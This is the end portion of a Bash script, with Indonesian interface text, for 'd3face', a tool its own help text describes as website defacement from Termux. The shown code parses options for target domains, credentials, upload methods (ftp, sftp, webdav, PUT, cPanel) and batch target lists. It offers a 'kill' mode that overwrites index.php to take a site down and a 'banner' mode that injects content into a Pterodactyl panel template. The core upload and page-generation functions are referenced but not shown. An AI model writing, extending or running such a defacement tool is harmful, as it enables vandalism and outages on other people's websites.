  list=$(ls -1t "$BKD" 2>/dev/null | grep -v '\.meta$' | head -20)
  [ -z "$list" ] && { warn "belum ada backup"; return; }
  printf '%s\n' "$list" | nl -w2 -s'. '
  n=$(ask "nomor")
  f=$(printf '%s\n' "$list" | sed -n "${n}p")
  [ -z "$f" ] && { bad "nomor tidak ada"; return; }

  path=""
  [ -f "$BKD/$f.meta" ] && path=$(sed -n 's/^path=//p' "$BKD/$f.meta")
  [ -z "$path" ] && path="${PATH_DIR%/}/$(printf '%s' "$f" | sed 's/^[0-9]*_//' | tr '_' '/')"

  host=$(ask "domain")
  sch=$(ask "skema (http/https)" "https")
  u=$(ask "username"); w=$(ask "password")
  m=$(ask "metode (ftp/sftp/webdav)" "ftp")
  case $m in ftp) port=21 ;; sftp) port=22 ;; *) port=443 ;; esac

  [ -z "$host" ] && { bad "domain wajib"; return; }
  [ -z "$u" ] || [ -z "$w" ] && { bad "kredensial wajib"; return; }
  askyn "timpa $sch://$host$path ?" || return

  spin_start "mengirim backup"
  upload "$m" "$host" "$port" "$sch" "$path" "$u" "$w" "$BKD/$f"; rc=$?
  spin_stop
  if [ "$rc" = 0 ]; then ok "restore terkirim"
  else bad "restore: $(explain "$rc")${UPHTTP:+ [HTTP $UPHTTP]}"; fi
}

preview() {
  clear 2>/dev/null
  banner
  printf '%s\n\n' "${M}  PRATINJAU${R}"
  local tpl alias msg f
  tpl=$(ask "template (1-5)" "$TPL")
  alias=$(ask "alias" "$ALIAS")
  msg=$(ask "pesan" "$MSG")
  case $tpl in 1|2|3|4|5) ;; *) tpl=1 ;; esac
  f=$(mktemp "${TMPDIR:-/tmp}/d3face.XXXXXX") || return
  TMPFILES+=("$f")
  if [ "$tpl" = 5 ]; then ptero_snippet "$alias" "$msg" "contoh.test" "MARKER" >"$f"
  else gen_page "$tpl" "$alias" "$msg" "contoh.test" "MARKER" >"$f"; fi
  hr; sed -e 's/</\n</g' "$f" | head -45; hr
  askyn "jadikan template default?" "n" && { TPL=$tpl; save; ok "template: $(tname "$tpl")"; }
}

setting() {
  clear 2>/dev/null
  banner
  printf '%s\n\n' "${Y}  PENGATURAN${R}"
  ALIAS=$(ask "alias default" "$ALIAS")
  MSG=$(ask "pesan default" "$MSG")
  PATH_DIR=$(ask "folder default" "$PATH_DIR")
  METHOD=$(ask "metode default" "$METHOD")
  TPL=$(ask "template default" "$TPL")
  MODE=$(ask "mode (auto/kill/banner)" "$MODE")
  case $TPL in 1|2|3|4|5) ;; *) TPL=1 ;; esac
  case $MODE in auto|kill|banner) ;; *) MODE=auto ;; esac
  save && ok "disimpan"
}

usage() {
  cat <<EOF
d3face $V — deface website dari Termux

  d3face                      menu
  d3face -d DOMAIN [opsi]     langsung jalan

opsi:
  -d, --domain DOMAIN   target
  -m, --method M        auto|ftp|sftp|webdav|put|cpanel
  -u, --user USER       username
  -p, --pass PASS       password
  -P, --path DIR        folder tujuan / webroot
  -s, --scheme S        http|https
      --port N          port manual
  -t, --tpl N           template 1-5
  -a, --alias NAME      alias
      --mode M          auto|kill|banner
      --panel P         auto|pterodactyl|laravel|generic
  -l, --list FILE       batch
  -n, --dry-run         tanpa upload
  -y, --yes             tanpa konfirmasi
  -V, --version         versi
  -h, --help            bantuan

mode:
  kill     timpa index.php, panel mati
  banner   sisipkan bilah ke wrapper.blade.php, panel tetap hidup
  auto     banner untuk panel, kill untuk situs biasa
EOF
}

main() {
  while [ $# -gt 0 ]; do
    case $1 in
      -d|--domain)  [ $# -ge 2 ] || die "opsi $1 butuh nilai"; HOST=$2; shift 2 ;;
      -m|--method)  [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_METHOD=$2; shift 2 ;;
      -u|--user)    [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_USER=$2; shift 2 ;;
      -p|--pass)    [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_PASS=$2; shift 2 ;;
      -P|--path)    [ $# -ge 2 ] || die "opsi $1 butuh nilai"; CLI_PATH=$2; shift 2 ;;
      -s|--scheme)  [ $# -ge 2 ] || die "opsi $1 butuh nilai"; SCHEME=$2; shift 2 ;;
      --port)       [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_PORT=$2; shift 2 ;;
      -t|--tpl)     [ $# -ge 2 ] || die "opsi $1 butuh nilai"; CLI_TPL=$2; shift 2 ;;
      -a|--alias)   [ $# -ge 2 ] || die "opsi $1 butuh nilai"; CLI_ALIAS=$2; shift 2 ;;
      --mode)       [ $# -ge 2 ] || die "opsi $1 butuh nilai"; MODE=$2; shift 2 ;;
      --panel)      [ $# -ge 2 ] || die "opsi $1 butuh nilai"; PANEL=$2; shift 2 ;;
      -l|--list)    [ $# -ge 2 ] || die "opsi $1 butuh nilai"; BATCHF=$2; shift 2 ;;
      -n|--dry-run) DRY=1; shift ;;
      -y|--yes)     YES=1; shift ;;
      -V|--version) printf 'd3face %s\n' "$V"; exit 0 ;;
      -h|--help)    usage; exit 0 ;;
      *) warn "opsi tak dikenal: $1"; shift ;;
    esac
  done

  init
  [ -n "$CLI_TPL" ]   && TPL=$CLI_TPL
  [ -n "$CLI_ALIAS" ] && ALIAS=$CLI_ALIAS
  [ -n "$CLI_PATH" ]  && PATH_DIR=$CLI_PATH
  case $MODE in auto|kill|banner|"") ;; *) die "mode tidak dikenal: $MODE" ;; esac
  case $PANEL in auto|pterodactyl|laravel|generic|"") ;; *) die "panel tidak dikenal: $PANEL" ;; esac

  [ -n "$BATCHF" ] && { batch "$BATCHF"; exit $?; }
  if [ -n "$HOST" ]; then do_deface "$HOST"; exit $?; fi

  while :; do
    menu
    case $(ask "pilih" "0") in
      1) recon; pause ;;
      2) do_deface ""; pause ;;
      3) restore; pause ;;
      4) preview; pause ;;
      5) setting; pause ;;
      0) clear 2>/dev/null; exit 0 ;;
      *) warn "pilihan salah"; sleep 1 ;;
    esac
  done
}

trap 'spin_stop; echo; warn "dibatalkan"' INT
trap cleanup EXIT
main "$@"
